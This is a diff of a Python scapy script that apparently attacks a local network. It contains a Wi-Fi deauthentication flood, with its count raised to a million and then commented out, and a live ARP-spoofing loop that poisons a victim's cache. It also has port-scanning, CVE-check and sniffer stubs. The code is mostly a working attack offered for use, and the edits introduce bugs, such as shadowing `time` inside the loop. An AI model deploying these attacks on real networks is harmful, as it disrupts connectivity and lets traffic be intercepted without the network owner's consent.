@@ -1,4 +1,5 @@
 from scapy.all import *
+import datetime
 
 target_ip = "192.168.100.21"
 router_ip = "192.168.100.1"
@@ -12,9 +13,11 @@ end_port = 65535
 open_port = []
 
 #deauthentication attack
+"""
 deauth_frame = RadioTap()/Dot11(addr1=target_mac, addr2="ff:ff:ff:ff:ff:ff", addr3="ff:ff:ff:ff:ff:ff")/Dot11Deauth()
-send_packets = sendp(deauth_frame, iface="wlp1s0", count=30, inter=0.1)
+send_packets = sendp(deauth_frame, iface="wlp1s0", count=1000000, inter=0.1)
 print(deauth_frame.summary())
+"""
 
 #crafting malicious packet
 """
@@ -42,7 +45,6 @@ else:
     print("[-] response failed!")
 """
 
-
 #vulnerability scanning idea
 """
 def check_cve_vulnerabilities(target_ip):
@@ -56,6 +58,7 @@ def check_cve_vulnerabilities(target_ip):
 
 check_cve_vulnerabilities(target_ip)
 """
+
 #port scanning
 """
 for port in range(start_port, end_port + 1):
@@ -79,14 +82,18 @@ arp_response_router = ARP(pdst=router_ip, psrc=target_ip, op=2)
 while True:
     if True:
         send(arp_response_victim, verbose=0)
-        send(arp_response_router, verbose=0)
+        #send(arp_response_router, verbose=0)
         time.sleep(2)
-        print("[+] arpspoofing attack successfully performed!")
+        time = datetime.datetime.now()
+        current_time = f"[{time.hour}:{time.minute}:{time.second}]" 
+        print(current_time,"[+] arpspoofing attack successfully performed!")
     else:
-        print("[+] attack failed!")
-"""
+        print(current_time,"[+] attack failed!")
 
 #packet sniffing
+"""
+
+#packet sniffer
 """
 def packet_sniffer(packet):
     if IP in packet:
